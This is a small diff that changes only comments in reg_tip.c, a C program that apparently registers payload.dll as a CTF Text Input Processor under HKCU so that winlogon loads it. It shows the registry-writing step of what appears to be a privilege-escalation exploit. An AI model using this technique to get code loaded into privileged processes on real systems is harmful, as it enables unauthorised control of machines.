@@ -1,5 +1,5 @@
 /*
- * reg_tip.c  -  Register payload.dll as a CTF Text Input Processor (TIP)
+ * reg_tip.c  Register payload.dll as a CTF Text Input Processor (TIP)
  *
  * When winlogon processes the Winlogon-desktop CTF session it reads TIP
  * registrations from the user's HKCU and loads them. If it loads them in
@@ -68,7 +68,7 @@ int main(int argc, char **argv) {
         const wchar_t *clsid = clsids[i];
         wchar_t path[512];
 
-        /* InProcServer32 - DLL path */
+        /* InProcServer32 (DLL path) */
         swprintf(path, 511,
             L"SOFTWARE\\Classes\\CLSID\\%ls\\InProcServer32", clsid);
         if (WriteRegSZ(HKEY_CURRENT_USER, path, NULL, dllW) &&
